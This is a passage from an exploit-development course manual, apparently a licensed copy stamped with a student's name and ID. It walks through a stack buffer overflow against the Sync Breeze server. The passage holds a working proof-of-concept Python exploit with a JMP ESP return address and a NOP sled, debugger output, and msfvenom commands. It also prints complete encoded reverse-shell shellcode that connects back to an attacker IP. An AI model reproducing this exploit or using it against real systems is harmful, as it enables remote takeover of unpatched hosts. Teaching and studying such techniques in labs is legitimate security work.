0x0D is also a bad character as we’ve already discussed: 
0:008> db esp - 10 L20 
014a744c  41 41 41 41 41 41 41 41-42 42 42 42 43 43 43 43  AAAAAAAABBBBCCCC 
014a745c  01 02 03 04 05 06 07 08-09 0b 0c 00 68 bb a7 00  ............h... 
Listing 69 - Truncated buffer by the return character 
Let’s repeat these steps until we have verified every character. Through this process, we’ll 
discover that 0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, and 0x3D will mangle our input buffer while 
attempting to overflow the destination buffer. Now we know which characters we need to avoid. 
3.4.4.1 Exercises 
1. 
Repeat the process to identify the bad characters. 
2. 
Why are these characters not allowed? How do these bad hex characters translate to ASCII? 
3.4.5 Redirecting the Execution Flow 
At this point, we have control of the EIP register and plenty of space for our shellcode that is 
easily accessible through the ESP register. We also know which characters are safe, and which 
are not. Our next task is to find a way to redirect the execution flow to the shellcode located at the 
memory address the ESP register is pointing to at the time of the crash. 
The most intuitive approach might be trying to replace the B’s that overwrite EIP with the address 
that pops up in the ESP register at the time of the crash. However, as we mentioned earlier, the 
value of ESP changes from crash to crash. Stack addresses change often, especially in threaded 
applications such as Sync Breeze, because each thread has a reserved stack region in memory 
allocated by the operating system. 
Therefore, hard-coding a specific stack address would not be a reliable way of reaching our 
buffer. 
3.4.6 Finding a Return Address 
We can still store our shellcode at the address pointed to by ESP, but we need a consistent way to 
execute that code. One solution is to leverage a JMP ESP instruction, which as the name 
suggests, “jumps” to the address pointed by ESP when it executes. If we can find a reliable static 
address that contains this instruction, we can redirect EIP to this address. Then, at the time of the 
crash, the JMP ESP instruction will be executed and this “indirect jump” will direct the execution 
flow into our shellcode. 
Many support libraries in Windows contain this commonly-used instruction, but we need to find a 
reference that meets two important criteria. First, the address used in the library must be static, 
which eliminates the libraries compiled with ASLR support. Second, the address of the instruction 
must not contain any of the bad characters that would break the exploit, since the address will be 
part of our input buffer. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
73 
To determine the protections of a particular module, we can check the DllCharacteristics member 
of the IMAGE_OPTIONAL_HEADER71 structure, which is part of the IMAGE_NT_HEADERS72 
structure. The latter can be found in the PE header73 of the target module. 
The Portable Executable (PE) format starts with the MS DOS header,74 which contains an offset to 
the start of the PE header at offset 0x3C. 
Let’s try to find the protections of the syncbrs.exe executable using the above information. 
We’ll start by getting the base address of the module inside WinDbg. We can use the List Loaded 
Module command (lm) and search for the pattern “syncbrs”. Then we use the dt command with 
the base address to dump the IMAGE_DOS_HEADER75 as shown in the Listing 70: 
0:008> lm m syncbrs 
Browse full module list 
start    end        module name 
00400000 00462000   syncbrs    (deferred)           
 
0:008> dt ntdll!_IMAGE_DOS_HEADER 0x00400000  
   +0x000 e_magic          : 0x5a4d 
   +0x002 e_cblp           : 0x90 
   +0x004 e_cp             : 3 
   +0x006 e_crlc           : 0 
   +0x008 e_cparhdr        : 4 
   +0x00a e_minalloc       : 0 
   +0x00c e_maxalloc       : 0xffff 
   +0x00e e_ss             : 0 
   +0x010 e_sp             : 0xb8 
   +0x012 e_csum           : 0 
   +0x014 e_ip             : 0 
   +0x016 e_cs             : 0 
   +0x018 e_lfarlc         : 0x40 
   +0x01a e_ovno           : 0 
   +0x01c e_res            : [4] 0 
   +0x024 e_oemid          : 0 
   +0x026 e_oeminfo        : 0 
   +0x028 e_res2           : [10] 0 
   +0x03c e_lfanew         : 0n232 
    
0:008> ? 0n232 
Evaluate expression: 232 = 000000e8 
Listing 70 - Dumping the IMAGE_DOS_HEADER structure to obtain the offset to the PE header 
 
71 (IMAGE_OPTIONAL_HEADER32 structure, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-
image_optional_header32 
72 (IMAGE_NT_HEADERS32 structure, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-
image_nt_headers32 
73 (PE Format, 2019), https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#dll-characteristics 
74 (PE-Portable-executable, 2017), https://www.aldeid.com/wiki/PE-Portable-executable 
75 (IMAGE_DOS_HEADER structure), https://www.nirsoft.net/kernel_struct/vista/IMAGE_DOS_HEADER.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
74 
Reviewing the output from Listing 70, we notice that at offset 0x3C, the e_lfanew field contains 
the offset to our PE header (0xE8) from the base address of syncbrs.exe. Now, let’s dump the 
IMAGE_NT_HEADERS structure at this address: 
0:008> dt ntdll!_IMAGE_NT_HEADERS 0x00400000+0xe8 
   +0x000 Signature        : 0x4550 
   +0x004 FileHeader       : _IMAGE_FILE_HEADER 
   +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER 
Listing 71 - Dumping the IMAGE_NT_HEADERS structure 
Finally, at offset 0x18 we have the IMAGE_OPTIONAL_HEADER structure we need that contains 
the DllCharacteristics field. 
0:008> dt ntdll!_IMAGE_OPTIONAL_HEADER 0x00400000+0xe8+0x18 
   +0x000 Magic            : 0x10b 
   +0x002 MajorLinkerVersion : 0x6 '' 
   +0x003 MinorLinkerVersion : 0 '' 
   +0x004 SizeOfCode       : 0x32000 
   +0x008 SizeOfInitializedData : 0x2f000 
   +0x00c SizeOfUninitializedData : 0 
   +0x010 AddressOfEntryPoint : 0x30484 
   +0x014 BaseOfCode       : 0x1000 
   +0x018 BaseOfData       : 0x33000 
   +0x01c ImageBase        : 0x400000 
   +0x020 SectionAlignment : 0x1000 
   +0x024 FileAlignment    : 0x1000 
   +0x028 MajorOperatingSystemVersion : 4 
   +0x02a MinorOperatingSystemVersion : 0 
   +0x02c MajorImageVersion : 0 
   +0x02e MinorImageVersion : 0 
   +0x030 MajorSubsystemVersion : 4 
   +0x032 MinorSubsystemVersion : 0 
   +0x034 Win32VersionValue : 0 
   +0x038 SizeOfImage      : 0x62000 
   +0x03c SizeOfHeaders    : 0x1000 
   +0x040 CheckSum         : 0 
   +0x044 Subsystem        : 3 
   +0x046 DllCharacteristics : 0 
   +0x048 SizeOfStackReserve : 0x100000 
   +0x04c SizeOfStackCommit : 0x1000 
   +0x050 SizeOfHeapReserve : 0x100000 
   +0x054 SizeOfHeapCommit : 0x1000 
   +0x058 LoaderFlags      : 0 
   +0x05c NumberOfRvaAndSizes : 0x10 
   +0x060 DataDirectory    : [16] _IMAGE_DATA_DIRECTORY 
Listing 72 - Dumping the IMAGE_OPTIONAL_HEADER structure 
Now we can read the current value of DllCharacteristics and find that it is 0x00. This means that 
the syncbrs.exe executable does not have any protections enabled such as SafeSEH76 (Structured 
Exception Handler Overwrite), an exploit-preventative memory protection technique, ASLR, or 
NXCompat (DEP protection). 
 
76 (Microsoft, 2016), https://docs.microsoft.com/en-us/cpp/build/reference/safeseh-image-has-safe-exception-handlers?view=msvc-
160 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
75 
In other words, the executable has not been compiled with any memory protection schemes, and 
will always reliably load at the same address, making it ideal for our purposes. 
Unfortunately, the structure above also shows the ImageBase member being set to 0x400000, 
meaning that the preferred load address for syncbrs.exe is 0x00400000. This indicates that all 
instructions’ addresses (0x004XXXXX) will contain at least one null character, making this module 
unsuitable for our input buffer. 
Now we understand how to do this manually; but it is time consuming and tedious. Fortunately, 
there are automated tools that can speed up this process. For this module, we will use Process 
Hacker.77 This is an option-rich tool that detects mitigations that have been around for a long 
time, such as DEP and ASLR, in addition to more modern mitigations such as ACG78 and CFG. 
We can launch Process Hacker from C:\Tools\processhacker-2.39-bin\x86\ProcessHacker.exe as 
an administrator. Next, we’ll locate the syncbrs.exe executable as shown in Figure 19: 
 
Figure 19: Locating the syncbrs.exe executable in Process Hacker 
 
77 (Process Hacker), https://processhacker.sourceforge.io/ 
78 (Microsoft, 2017), https://blogs.windows.com/msedgedev/2017/02/23/mitigating-arbitrary-native-code-execution/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
76 
 
When we double click the syncbrs.exe executable, it opens the properties window. Under the 
General tab, we’ll find the Mitigation Policies field, which is currently set to “None”. Clicking on 
Details also shows no mitigations in place, confirming what we found out manually within the 
debugger. 
 
Figure 20: Inspecting the Mitigations of the Sync Breeze Service using Process Hacker 
Browsing to the Module tab provides us with all the DLLs that are loaded in the process memory. 
To inspect the DllCharacteristics, we can double click on a module and open the properties 
window illustrated in Figure 21. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
77 
 
Figure 21: Inspecting ntdll.dll protections within the syncbrs.exe memory space 
Now that we know how to determine various mitigations of an executable or DLL, let’s try to find a 
suitable module to use in our exploit. 
Searching through all the modules, we discover that LIBSSP.DLL suits our needs and the address 
range doesn’t seem to contain bad characters. This is perfect. Now we need to find the address 
of a naturally-occurring JMP ESP instruction within this module. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
78 
 
Figure 22: Inspecting the LIBSSP.DLL using Process Hacker 
Advanced tip: If this application was compiled with DEP support, our JMP ESP 
address would need to be located in the .text code segment of the module. This 
is the only segment with both read (R) and executable (E) permissions. Since 
DEP is not enabled in this case, we can use instructions from any address in this 
module. 
To find the opcode equivalent of JMP ESP, we’ll use the Metasploit NASM Shell ruby script msf-
nasm_shell, which produces the results shown in Listing 73: 
kali@kali:~$ msf-nasm_shell 
nasm > jmp esp 
00000000  FFE4              jmp esp 
Listing 73 - Finding the opcode of JMP ESP 
We can search for a JMP ESP instruction using the opcodes from Listing 73 (0xFF 0xE4) in all 
sections of LIBSSP.DLL using WinDbg’s search (s) command. 
Let’s enter s and specify what memory format we are looking for; in our case, we’ll search for 
bytes using the -b argument. This is followed by the start and end of the memory range we are 
going to search through. In our case, we want to search the target LIBSSP.DLL module memory 
range; we can use the lm command to gather this information. Finally, the last parameter will be 
the sequence of bytes we are looking for, separated by whitespace. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
79 
The output of the final command, s -b 10000000 10223000 0xff 0xe4, is shown in Listing 74: 
0:007> lm m libspp 
Browse full module list 
start    end        module name 
10000000 10223000   libspp   C (export symbols)       C:\Program Files\Sync Breeze 
Enterprise\bin\libspp.dll 
 
0:007> s -b 10000000 10223000 0xff 0xe4 
10090c83  ff e4 0b 09 10 02 0c 09-10 24 0c 09 10 46 0c 09  .........$...F.. 
Listing 74 - Finding the JMP ESP instruction 
In this example, the output reveals one address containing a JMP ESP instruction (0x10090c83), 
which fortunately does not contain any of our bad characters. 
Let’s verify our finding by inspecting the instructions at address 0x10090c83 in WinDbg. We can 
do this using the unassemble (u) command, followed by the memory address of our JMP ESP 
instruction: 
0:007> u 10090c83 
libspp!SCA_FileScout::GetStatusValue+0xb3: 
10090c83 ffe4            jmp     esp 
10090c85 0b09            or      ecx,dword ptr [ecx] 
10090c87 1002            adc     byte ptr [edx],al 
10090c89 0c09            or      al,9 
10090c8b 10240c          adc     byte ptr [esp+ecx],ah 
10090c8e 0910            or      dword ptr [eax],edx 
10090c90 46              inc     esi 
10090c91 0c09            or      al,9 
Listing 75 - Unassemble the memory address where the JMP ESP instruction is located 
The above listing shows that our address does indeed point to an opcode that translates to a 
JMP ESP instruction. 
By redirecting EIP to this address at the time of the crash, the JMP ESP instruction will be 
executed, leading the execution flow into our shellcode placeholder. 
Let’s try it out by updating the eip variable to reflect this address in our proof of concept: 
#!/usr/bin/python 
import socket 
import sys 
 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 800 
   
  filler = b"A" * 780 
  eip = b"\x83\x0c\x09\x10" # 0x10090c83 - JMP ESP 
  offset = b"C" * 4 
  shellcode = "D" * (1500 - len(filler) - len(eip) - len(offset)) 
  inputBuffer = filler + eip + offset + shellcode 
  content = b"username=" + inputBuffer + b"&password=A" 
... 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
80 
Listing 76 - stack_overflow_0x06.py: Redirecting EIP 
In listing 76 the JMP ESP address is written in reverse order; this is because of the endian79 byte 
order required by the x86 architecture. Operating systems can store addresses and data in 
memory in different formats. 
Generally speaking, the format used to store addresses in memory depends on the architecture of 
the operating system. Little endian is currently the most widely-used format and is used by the 
x86 and AMD64 architectures. Big endian was historically used by the Sparc and PowerPC 
architectures. 
In the little endian format, the low-order byte of the number is stored in memory at the lowest 
address, and the high-order byte at the highest address. Therefore, we have to store the return 
address in reverse order in our buffer for the CPU to interpret it correctly in memory. 
Let’s place a breakpoint at address 0x10090c83 using bp in order to follow the execution of the 
JMP ESP instruction, and run our exploit again. The result is shown in Listing 77: 
0:009> bp 10090c83 
 
0:009> bl 
     0 e Disable Clear  10090c83     0001 (0001)  0:**** 
libspp!SCA_FileScout::GetStatusValue+0xb3 
      
0:009> g 
Breakpoint 0 hit 
eax=00000001 ebx=00000000 ecx=00647fb4 edx=00000358 esi=00640fa6 edi=008a8f50 
eip=10090c83 esp=0032745c ebp=0063a3e8 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
libspp!SCA_FileScout::GetStatusValue+0xb3: 
10090c83 ffe4            jmp     esp {0032745c} 
 
0:009> t 
eax=00000001 ebx=00000000 ecx=00647fb4 edx=00000358 esi=00640fa6 edi=008a8f50 
eip=0032745c esp=0032745c ebp=0063a3e8 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
0032745c 44              inc     esp 
 
0:009> dc eip L4 
0032745c  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD 
Listing 77 - Setting a breakpoint at the JMP ESP memory address inside WinDbg 
Our debugger shows that we reached our JMP ESP and hit the breakpoint we set. Using the t 
command in the debugger will single-step into our shellcode placeholder, which is currently just a 
bunch of D’s. 
Great! Now we just need to generate working shellcode and our exploit will be complete. 
3.4.6.1 Exercises 
1. 
Using WinDBG, try to determine the protections of the syncbrs.exe executable. 
 
79 (Wikipedia, 2019), http://en.wikipedia.org/wiki/Endianness 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
81 
2. 
Use Process Hacker to find a module loaded in the memory space of syncbrs.exe that is 
located at an address range without null bytes and is not compiled with any mitigations. 
3. 
Locate the address of a JMP ESP instruction that is usable in the exploit. 
4. 
Update your proof of concept to include the discovered JMP ESP, set a breakpoint on it, and 
follow the execution to the placeholder shellcode. 
5. 
Can you find a different assembly instruction that will achieve the same result? 
3.4.7 Generating Shellcode with Metasploit 
Writing our own custom shellcode is something we will cover in a later module. For now, the 
Metasploit Framework provides us with tools and utilities that make generating complex 
payloads simple. 
To build our shellcode, we’ll use the MSFvenom80 tool. It can generate shellcode payloads and 
encode81 them using a variety of different encoders. Currently, the msfvenom command can 
automatically generate over 500 shellcode payload options, as shown in the excerpt below: 
kali@kali:~$ msfvenom -l payloads 
 
Framework Payloads (546 total) [--payload <value>] 
================================================== 
 
    Name                            Description 
    ----                            ----------- 
    aix/ppc/shell_bind_tcp          Listen for a connection and spawn a command shell 
    aix/ppc/shell_find_port         Spawn a shell on an established connection 
    aix/ppc/shell_interact          Simply execve /bin/sh (for inetd programs) 
    aix/ppc/shell_reverse_tcp       Connect back to attacker and spawn a command shell 
... 
    windows/shell_reverse_tcp       Connect back to attacker and spawn a command shell 
... 
Listing 78 - Command to list all Metasploit shellcode payloads 
The msfvenom command is fairly easy to use. We will use -p to generate a basic payload called 
windows/shell_reverse_tcp, which acts like a Netcat reverse shell. This payload minimally requires 
an LHOST parameter, to define the destination IP address for the shell. An optional LPORT 
parameter specifying the connect-back port may also be defined. We can use the format flag -f 
to select C-formatted shellcode, which makes it easy to plug the payload into our Python script. 
The complete command that generates our shellcode is as follows: 
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 -f 
c 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload 
[-] No arch selected, selecting arch: x86 from the payload 
No encoder or badchars specified, outputting raw payload 
Payload size: 324 bytes 
Final size of c file: 1386 bytes 
 
80 (Wei Chen, 2014), https://blog.rapid7.com/2014/12/09/good-bye-msfpayload-and-msfencode/ 
81 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Shellcode#Shellcode_encoding 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
82 
unsigned char buf[] =  
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30" 
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff" 
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52" 
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1" 
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b" 
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03" 
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b" 
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24" 
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb" 
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c" 
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68" 
"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68" 
"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x77\x78\x68" 
"\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61" 
"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2" 
"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6" 
"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44" 
"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56" 
"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff" 
"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6" 
"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb" 
"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"; 
Listing 79 - Generate metasploit shellcode 
This seems like a simple solution - however, checking carefully we identify bad characters (null 
bytes) in the generated shellcode. 
Since we cannot use a generic shellcode, we must encode it to fit our target environment. 
Generally speaking, encoders can replace bad characters with allowed ones by using a particular 
scheme. For example, an encoder might transform our shellcode into a purely alphanumeric 
payload, getting rid of bad characters. This could be useful for target applications that only accept 
text-based characters as input. In order to run successfully, the encoded shellcode will have to be 
decoded at run-time. Because of that, the encoder will also prepend the final encoded shellcode 
with a small decoder stub. 
In this particular case, we’ll use a more advanced and very popular encoder, shikata_ga_nai,82 to 
encode our shellcode. We can tell the encoder which bad characters to ignore with the -b option: 
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 -f 
c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload 
[-] No arch selected, selecting arch: x86 from the payload 
Found 11 compatible encoders 
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai 
x86/shikata_ga_nai succeeded with size 351 (iteration=0) 
x86/shikata_ga_nai chosen with final size 351 
Payload size: 351 bytes 
Final size of c file: 1500 bytes 
unsigned char buf[] =  
"\xdd\xc4\xba\x6d\xdc\x1e\xf1\xd9\x74\x24\xf4\x5e\x29\xc9\xb1" 
 
82 (Rapid7, 2018), https://www.rapid7.com/db/modules/encoder/x86/shikata_ga_nai 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
83 
"\x52\x31\x56\x17\x83\xee\xfc\x03\x3b\xcf\xfc\x04\x3f\x07\x82" 
"\xe7\xbf\xd8\xe3\x6e\x5a\xe9\x23\x14\x2f\x5a\x94\x5e\x7d\x57" 
"\x5f\x32\x95\xec\x2d\x9b\x9a\x45\x9b\xfd\x95\x56\xb0\x3e\xb4" 
"\xd4\xcb\x12\x16\xe4\x03\x67\x57\x21\x79\x8a\x05\xfa\xf5\x39" 
"\xb9\x8f\x40\x82\x32\xc3\x45\x82\xa7\x94\x64\xa3\x76\xae\x3e" 
"\x63\x79\x63\x4b\x2a\x61\x60\x76\xe4\x1a\x52\x0c\xf7\xca\xaa" 
"\xed\x54\x33\x03\x1c\xa4\x74\xa4\xff\xd3\x8c\xd6\x82\xe3\x4b" 
"\xa4\x58\x61\x4f\x0e\x2a\xd1\xab\xae\xff\x84\x38\xbc\xb4\xc3" 
"\x66\xa1\x4b\x07\x1d\xdd\xc0\xa6\xf1\x57\x92\x8c\xd5\x3c\x40" 
"\xac\x4c\x99\x27\xd1\x8e\x42\x97\x77\xc5\x6f\xcc\x05\x84\xe7" 
"\x21\x24\x36\xf8\x2d\x3f\x45\xca\xf2\xeb\xc1\x66\x7a\x32\x16" 
"\x88\x51\x82\x88\x77\x5a\xf3\x81\xb3\x0e\xa3\xb9\x12\x2f\x28" 
"\x39\x9a\xfa\xff\x69\x34\x55\x40\xd9\xf4\x05\x28\x33\xfb\x7a" 
"\x48\x3c\xd1\x12\xe3\xc7\xb2\xdc\x5c\xb0\x3a\xb5\x9e\x3e\xba" 
"\xfe\x16\xd8\xd6\x10\x7f\x73\x4f\x88\xda\x0f\xee\x55\xf1\x6a" 
"\x30\xdd\xf6\x8b\xff\x16\x72\x9f\x68\xd7\xc9\xfd\x3f\xe8\xe7" 
"\x69\xa3\x7b\x6c\x69\xaa\x67\x3b\x3e\xfb\x56\x32\xaa\x11\xc0" 
"\xec\xc8\xeb\x94\xd7\x48\x30\x65\xd9\x51\xb5\xd1\xfd\x41\x03" 
"\xd9\xb9\x35\xdb\x8c\x17\xe3\x9d\x66\xd6\x5d\x74\xd4\xb0\x09" 
"\x01\x16\x03\x4f\x0e\x73\xf5\xaf\xbf\x2a\x40\xd0\x70\xbb\x44" 
"\xa9\x6c\x5b\xaa\x60\x35\x6b\xe1\x28\x1c\xe4\xac\xb9\x1c\x69" 
"\x4f\x14\x62\x94\xcc\x9c\x1b\x63\xcc\xd5\x1e\x2f\x4a\x06\x53" 
"\x20\x3f\x28\xc0\x41\x6a"; 
Listing 80 - Generating shellcode without bad characters 
The resulting shellcode is 351 bytes long, contains no bad characters, and will send a reverse 
shell to our IP address on port 443. 
3.4.7.1 Exercises 
1. 
Update your proof of concept by replacing the shellcode placeholder with the encoded 
payload generated by msfvenom. 
2. 
Set up a Netcat listener on your Kali machine and run the exploit against your target. Do you 
get a shell? 
3. 
Relaunch the exploit and follow the execution flow in the debugger. Step through the 
decoder stub and try to understand what is happening. 
3.4.8 Getting a Shell 
Getting a reverse shell from Sync Breeze should now be as simple as replacing our buffer of D’s 
with the shellcode and launching our exploit. However, in this particular case, we have another 
hurdle to overcome. 
In the previous step, we generated an encoded shellcode using msfvenom. As mentioned in the 
previous section, because of the encoding, the shellcode is not directly executable and is 
prepended by a decoder stub. The job of this stub is to iterate over the encoded shellcode bytes 
and decode them back to their original executable form. To do this, the decoder needs to get its 
address in memory and look a few bytes ahead to locate the encoded shellcode that it needs to 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
84 
decode. During the process of gathering the decoder stub’s location in memory, the code 
performs a sequence of assembly instructions commonly referred to as a GetPC83 routine. 
This short routine moves the value of the EIP register (sometimes referred to as the Program 
Counter or PC) into another register. 
As with other GetPC routines, those used by shikata_ga_nai have an unfortunate side-effect of 
writing data at and around the top of the stack. This eventually mangles several bytes close to the 
address pointed at by the ESP register. This small change on the stack is a problem for us 
because the decoder starts exactly at the address pointed to by the ESP register. In short, the 
GetPC routine execution ends up changing a few bytes of the decoder itself, and potentially the 
encoded shellcode. This will eventually cause the decoding process to fail and crash the target 
process as shown in the listing below. 
0:010> t 
(914.e64): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=00000001 ebx=00000000 ecx=001a121c edx=f11edc6d esi=0019c196 edi=00a27420 
eip=01447467 esp=0144745c ebp=0019c6b8 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202 
01447467 0000            add     byte ptr [eax],al          ds:0023:00000001=?? 
0:010>  
eax=00000001 ebx=00000000 ecx=001a121c edx=f11edc6d esi=0019c196 edi=00a27420 
eip=779a44a1 esp=01446ef8 ebp=0019c6b8 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
ntdll!KiUserExceptionDispatcher+0x1: 
779a44a1 8b4c2404        mov     ecx,dword ptr [esp+4] ss:0023:01446efc=01446f1c 
Listing 81 - Causing an access violation in the shellcode decoding process 
One way to avoid this issue is by adjusting ESP backwards, making use of assembly instructions 
such as DEC ESP, SUB ESP, 0xXX before executing the decoder. 
Alternatively, we could create a wide “landing pad” for our JMP ESP, so that when execution lands 
anywhere on this pad, it will continue on to our payload. This may sound complicated, but in 
practice we simply precede our payload with a series of No Operation (NOP) instructions, which 
have an opcode value of 0x90. As the name suggests, these instructions do nothing, and simply 
pass execution to the next instruction. Used this way, these instructions, also defined as a NOP 
sled or NOP slide, will let the CPU “slide” through the NOPs until the payload is reached. 
Regardless of which method we use, by the time the execution reaches the shellcode decoder, 
the stack pointer is far enough away not to corrupt the shellcode when the GetPC routine 
overwrites a few bytes on the stack. 
After adding the NOP sled, our final exploit looks similar to Listing 82 below: 
#!/usr/bin/python 
import socket 
import sys 
 
 
83 (Hacking/Shellcode/GetPC, Internet Archive 2013), 
https://web.archive.org/web/20131017021753/http://skypher.com/wiki/index.php/Hacking/Shellcode/GetPC 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
85 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 800 
   
  filler = b"A" * 780 
  eip = b"\x83\x0c\x09\x10" # 0x10090c83 - JMP ESP 
  offset = b"C" * 4 
  nops = b"\x90" * 10 
  shellcode = bytearray( 
  "\xdd\xc4\xba\x6d\xdc\x1e\xf1\xd9\x74\x24\xf4\x5e\x29\xc9\xb1" 
  "\x52\x31\x56\x17\x83\xee\xfc\x03\x3b\xcf\xfc\x04\x3f\x07\x82" 
  "\xe7\xbf\xd8\xe3\x6e\x5a\xe9\x23\x14\x2f\x5a\x94\x5e\x7d\x57" 
  "\x5f\x32\x95\xec\x2d\x9b\x9a\x45\x9b\xfd\x95\x56\xb0\x3e\xb4" 
  "\xd4\xcb\x12\x16\xe4\x03\x67\x57\x21\x79\x8a\x05\xfa\xf5\x39" 
  "\xb9\x8f\x40\x82\x32\xc3\x45\x82\xa7\x94\x64\xa3\x76\xae\x3e" 
  "\x63\x79\x63\x4b\x2a\x61\x60\x76\xe4\x1a\x52\x0c\xf7\xca\xaa" 
  "\xed\x54\x33\x03\x1c\xa4\x74\xa4\xff\xd3\x8c\xd6\x82\xe3\x4b" 
  "\xa4\x58\x61\x4f\x0e\x2a\xd1\xab\xae\xff\x84\x38\xbc\xb4\xc3" 
  "\x66\xa1\x4b\x07\x1d\xdd\xc0\xa6\xf1\x57\x92\x8c\xd5\x3c\x40" 
  "\xac\x4c\x99\x27\xd1\x8e\x42\x97\x77\xc5\x6f\xcc\x05\x84\xe7" 
  "\x21\x24\x36\xf8\x2d\x3f\x45\xca\xf2\xeb\xc1\x66\x7a\x32\x16" 
  "\x88\x51\x82\x88\x77\x5a\xf3\x81\xb3\x0e\xa3\xb9\x12\x2f\x28" 
  "\x39\x9a\xfa\xff\x69\x34\x55\x40\xd9\xf4\x05\x28\x33\xfb\x7a" 
  "\x48\x3c\xd1\x12\xe3\xc7\xb2\xdc\x5c\xb0\x3a\xb5\x9e\x3e\xba" 
  "\xfe\x16\xd8\xd6\x10\x7f\x73\x4f\x88\xda\x0f\xee\x55\xf1\x6a" 
  "\x30\xdd\xf6\x8b\xff\x16\x72\x9f\x68\xd7\xc9\xfd\x3f\xe8\xe7" 
